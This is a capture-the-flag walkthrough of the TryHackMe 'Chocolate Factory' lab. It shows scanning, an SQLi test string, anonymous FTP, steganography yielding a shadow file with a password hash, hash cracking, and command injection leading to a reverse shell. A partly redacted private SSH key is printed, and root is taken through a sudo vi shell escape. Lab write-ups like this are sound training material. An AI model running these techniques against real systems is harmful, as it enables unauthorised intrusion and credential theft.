# TryHackMe: Chocolate Factory

The [Chocolate Factory](https://tryhackme.com/room/chocolatefactory) room on TryHackMe.com is ranked as Easy. And is really quite easy. It focuses on various things like......

So, lets begin!

## Enumeration

The first thing we must do is run an `nmap` scan and along with that check if there is some webpage hosted by accessing the machine IP address via the web browser.

![login](./.images/login.png)

As soon as we see a login portal, the first thing that we can think of is SQLi.

We can try `admin:admin` and other such default credentials but none of those work. Also, appears that this login page is not susceptible to SQLi as different basic SQLi payloads such as `' OR 1=1--` and such do not help to login nor they raise an error.

Also, by this type our `nmap` scan would've completed

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ sudo nmap -sS -p- -T4 -oN open_ports 10.10.9.239
Nmap scan report for 10.10.9.239
Host is up (0.16s latency).
Not shown: 65506 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
101/tcp open  hostname
102/tcp open  iso-tsap
103/tcp open  gppitnp
104/tcp open  acr-nema
105/tcp open  csnet-ns
106/tcp open  pop3pw
107/tcp open  rtelnet
108/tcp open  snagas
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
112/tcp open  mcidas
113/tcp open  ident
114/tcp open  audionews
115/tcp open  sftp
116/tcp open  ansanotify
117/tcp open  uucp-path
118/tcp open  sqlserv
119/tcp open  nntp
120/tcp open  cfdptkt
121/tcp open  erpc
122/tcp open  smakynet
123/tcp open  ntp
124/tcp open  ansatrader
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 1954.23 seconds

┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ nmap -sC -sV -O -oN port_details -p21,22,80,100-125 10.10.9.239
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 11:25 EDT
Nmap scan report for 10.10.9.239
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.91.135
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
00/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
```

A lot of information is returned as a part of this `nmap` specific enumeration but all of that appear to be repetitive. 

Here, we can see that port 21 is open and anonymous login is also allowed on the same. So, we log on to FTP to see if some useful file can be found over there.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ ftp 10.10.9.239                                                                                              1 ⚙
Connected to 10.10.9.239.
220 (vsFTPd 3.0.3)
Name (10.10.9.239:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> mget gum_room.jpg
mget gum_room.jpg? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 2.04 secs (99.9543 kB/s)
```

It can be seen that a file called `gum_room.jpg` was found in the FTP directory. The file is an image of "doublemint chewing gum". Presence of such an image in FTP appears to be a bit suspicious, so we can check this for steganography using the tool `steghide`.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ steghide extract -sf gum_room.jpg                                                                     
Enter passphrase: 
wrote extracted data to "b64.txt".
```

From the result it is clear that the image was hiding another file named as `b64.txt`. We can check the content of this file as well

```base64
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ cat b64.txt                                                                                                  1 ⚙
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
```

It appears that this is `base64` encoded data which we can be decoded using the `base64 -d` function and store the result in a new file.

```
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ cat decoded
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

This is appears to be a `passwd` file. We can pass this file to `john` to crack the password for user `charlie` (as there is a hash only for `charile`).

```
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ john passwd -w=/usr/share/wordlists/rockyou.txt                                                       
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******           (charlie)
1g 0:00:11:57 DONE (2021-05-04 12:09) 0.001393g/s 1372p/s 1372c/s 1372C/s cocker6..cn123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And here we get the password for user "charlie". So, we can try to log on to the machine with SSH as  "charlie". 

```
┌──(kali㉿kali)-[~/Desktop/oscp/thm/chocolate_factory]
└─$ ssh charlie@10.10.9.239                                                                                      1 ⚙
The authenticity of host '10.10.9.239 (10.10.9.239)' can't be established.
ECDSA key fingerprint is SHA256:gd9u+ZN0RoEwz95lGsM97tRG/YPtIg9MwOxswHac8yM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.9.239' (ECDSA) to the list of known hosts.
charlie@10.10.9.239's password: 
Permission denied, please try again.
charlie@10.10.9.239's password: 
```

But looks like this is not the password using which we can get access to "charlie's" account. If not for SSH then we can try the same credenitals on the login page as well. 

## Gaining Access

These credentials do work on the login page and redirects to a page from where we can execute commands. It clearly appears that we can use this for command injection. So, initially to make sure command injection can be performed we can run some simple commands like `whoami`, `id`, `ls -la` and others. And for all these commands we get a proper response as well. So, the next thing that we can do is use a reverse shell payload, enter it in the command box and start a listener on our local machine to catch the reverse connection. 

We can use the payload:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444                
listening on [any] 4444 ...
connect to [10.8.91.135] from (UNKNOWN) [10.10.52.108] 46772
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
home.jpg
home.php
image.png
index.html
index.php.bak
key_rev_key
validate.php
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo)
```

Now, that we have a reverse shell we must upgrade it to an interactive shell. This can be done using the method mentioned over [here](https://0xnirvana.medium.com/gaining-interactive-reverse-shell-w-python-a4bd490735a8).

## Privilege Escalation to Another User

Once we get an interactive shell, we can start looking for the user flag. We can see that the `user.txt` is present in the directory `/home/charlie` but we can't access it as we are currently logged in as `www-data`. 

But we can try to switch user to "charlie" and try to use the same password that we had obtained earlier.

```bash
www-data@chocolate-factory:/home/charlie$ cat user.txt 
cat: user.txt: Permission denied
www-data@chocolate-factory:/home/charlie$ su charlie
Password: 
su: Authentication failure
```

But the password does not work. So, we must start exploring the files that we have access to. 

As our current user is `www-data`, we must begin looking for files in the `/var/www/html` directory (as most of the files associated in this directory are owned or managed by `www-data`).

```bash
www-data@chocolate-factory:/var/www/html$ ls -la
total 1152
drwxr-xr-x 2 root    root       4096 Oct  6  2020 .
drwxr-xr-x 3 root    root       4096 Sep 29  2020 ..
-rw------- 1 root    root      12288 Oct  1  2020 .swp
-rw-rw-r-- 1 charlie charley   65719 Sep 30  2020 home.jpg
-rw-rw-r-- 1 charlie charley     695 Sep 30  2020 home.php
-rw-rw-r-- 1 charlie charley 1060347 Sep 30  2020 image.png
-rw-rw-r-- 1 charlie charley    1466 Oct  1  2020 index.html
-rw-rw-r-- 1 charlie charley     273 Sep 29  2020 index.php.bak
-rw-r--r-- 1 charlie charley    8496 Sep 30  2020 key_rev_key
-rw-rw-r-- 1 charlie charley     303 Sep 30  2020 validate.php
```

There are 2 odd files present over here. First one is the `index.php.bak` and the second one is `key_rev_key`. 

In the `.bak` file we do not find any useful information but when we try to print `key_rev_key` all that is returned is some gibberish data. So, we can check its file type using the command `file`

```bash
www-data@chocolate-factory:/var/www/html$ file key_rev_key 
key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
```

It appears to be an ELF executable file. So, we can execute the string command on this file to see if we can find something useful

```
www-data@chocolate-factory:/var/www/html$ strings key_rev_key 
.....
.....
Enter your name: 
**********
 congratulations you have found the key:   
b'-VkgXhFf*************-********************QzY='
 Keep its safe
Bad name!
.....
.....
```

And here we get some key. We can try to decode it but it does not help in any way.

So, we need to enumerate even more. We can again take a look at "charlie's" directory and over there we can see that there are two files named `teleport` and `teleport.pub`. On checking their content, we can figure out that these are public and private keys.

```
www-data@chocolate-factory:/home/charlie$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
******************************rZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTg******************************QbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5******************************
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----

www-data@chocolate-factory:/home/charlie$ cat teleport.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhp2s9zd********************************ENH6Cm5FbUDMvXYrfn8yLdXC2nQ1LCaVLuFrjL2y/aQ9e/yUU6YuLUVXaGqVA8vD+6ecQXBRsvgoGoF6YgN59XmnEyYKqqC4lciTOSUAhc1iF/EuvxwFL8cmiH/uqYuqsOhc2HBiMHfOCi/tFS2TXkm/XUPQi2zKvnim9iEJCB2iitTuXjYRklrIiiYcqifWOSh93X+hh84HCDPok6U0fWMUmjIhmDY6YSGdKNSW1n2ZLOZDK/czgA5FCjdl4tv7NudInJwQRFo5s+VvR1HLcqg3v2W352H6NKD90z9Nhh7kvj charlie@chocolate-factory
```

From the `teleport.pub` key, it is clear that this key is for user charlie. So, we can SSH into "charlie's" account using these credentials easily.

```
ww-data@chocolate-factory:/home/charlie$ ssh charlie@localhost -i teleport
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:gd9u+ZN0RoEwz95lGsM97tRG/YPtIg9MwOxswHac8yM.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)
charlie@chocolate-factory:/$ 
```

## Privilege Escation to `root`

Now that we have access to the system as "charlie", the first thing that we can look at are the command that "charile" can run with `sudo`.

```bash
charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

It can be seen that "charlie" can run `/usr/bin/vi` with `sudo` privlege. So, we can head over to [GTFOBins](https://gtfobins.github.io/gtfobins/vi/) and use the command mentioned over there to gain access as `root` using the `/usr/bin/vi` command.

```bash
charlie@chocolate-factory:/$ sudo vi -c ':!/bin/sh' /dev/null

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
```

But in the `/root` directory, we do not find any `root.txt` file but we can see a `root.py` file.

```bash
# ls -la
total 40
drwx------  6 root    root    4096 Oct  7  2020 .
drwxr-xr-x 24 root    root    4096 Sep  1  2020 ..
-rw-------  1 root    root       0 Oct  7  2020 .bash_history
-rw-r--r--  1 root    root    3106 Apr  9  2018 .bashrc
drwx------  3 root    root    4096 Oct  1  2020 .cache
drwx------  3 root    root    4096 Sep 30  2020 .gnupg
drwxr-xr-x  3 root    root    4096 Sep 29  2020 .local
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rwxr-xr-x  1 charlie charley  491 Oct  1  2020 root.py
-rw-r--r--  1 root    root      66 Sep 30  2020 .selected_editor
drwx------  2 root    root    4096 Sep  1  2020 .ssh
# python root.py
Enter the key:  
```

When we try to run it, it asks for a key. If we recall we had found one such key from the `key_rev_key` in the `/var/www/html` directory. We can use try to use that key over here.

```
# python root.py
Enter the key:  
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{*********************************}

```

> **Note:** Key is the entire value **b'-......='**

With this we got the `root` for Chocolate Factory.

## Some Key Points to Take Away

1. Always keep looking for files that can be accessed as the current user.

## Mind Maps

1. Enumeration

   ![Chocolate_Factory_Enumeration](./.images/chocolateFactory_enumeration.png)

2. Privilege Escalation

   ![Chocolate_Factory_PrivEsc](./.images/chocolateFactory_privesc.png)

## References

1. [TryHackMe: Chocolate Factory](https://tryhackme.com/room/chocolatefactory)
2. [Gaining Interactive Shell w/ Python](https://0xnirvana.medium.com/gaining-interactive-reverse-shell-w-python-a4bd490735a8)
3. [GTFOBins](https://gtfobins.github.io)